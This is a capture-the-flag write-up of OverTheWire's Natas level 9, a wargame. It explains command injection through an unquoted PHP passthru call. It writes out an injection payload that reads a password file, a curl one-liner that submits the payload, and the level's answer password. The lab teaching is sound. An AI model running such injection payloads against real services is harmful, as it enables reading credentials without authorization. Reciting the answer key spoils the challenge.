# Natas Level 9 → 10

## Goal

The page has a search field that grep's a `dictionary.txt` file. The PHP passes your input *directly* into a shell command — so you can inject an extra command with `;`.

## Concepts you'll learn

- **Command injection**: when user input is concatenated into a shell command, shell metacharacters (`;`, `&&`, `|`, `$()`) let you break out of the intended command and run your own
- Reading PHP source to spot the vulnerable `passthru`/`shell_exec`/`system` call
- Using `cat` on the password file once you have shell command execution as the web user

## Walkthrough

### 1. View the source

```php
$key = $_REQUEST["needle"];

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

`$key` goes straight into a `passthru` call with no quoting. The shell sees:

```
grep -i <your input> dictionary.txt
```

### 2. Inject

Submit the search field with a value like:

```
x; cat /etc/natas_webpass/natas10
```

The shell now runs:

```
grep -i x; cat /etc/natas_webpass/natas10 dictionary.txt
```

It treats `;` as a command separator. The first `grep` runs (probably finding stuff containing `x`), and then `cat /etc/natas_webpass/natas10 dictionary.txt` runs — printing the password file and the dictionary.

The output page includes a long grep result *followed by* the password:

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

### 3. (Alternative) Curl

```bash
$ curl -u natas9:<pass> --data-urlencode "needle=x; cat /etc/natas_webpass/natas10" \
       http://natas9.natas.labs.overthewire.org/index.php | grep -E '^[a-zA-Z0-9]{32}$'
```

The final regex matches the 32-character password hidden in the output.

## The answer

The password for `natas10` is:

**`nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas9.natas.labs.overthewire.org/>
